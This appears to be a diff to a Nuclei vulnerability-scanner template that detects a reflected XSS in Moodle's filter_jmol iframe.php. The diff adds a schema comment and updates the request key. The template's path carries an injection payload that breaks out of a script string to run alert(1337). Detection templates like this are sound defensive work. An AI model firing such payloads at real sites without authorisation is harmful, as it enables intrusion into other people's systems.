@@ -1,9 +1,10 @@
+# yaml-language-server: $schema=https://raw.githubusercontent.com/projectdiscovery/nuclei/dev/pkg/templates/nuclei-jsonschema.json
 id: moodle-filter-jmol-xss
 info:
   name: Moodle filter_jmol XSS
   author: madrobot
   severity: medium
-requests:
+http:
   - method: GET
     path:
       - "{{BaseURL}}/filter/jmol/iframe.php?_USE=%22};alert(1337);//"
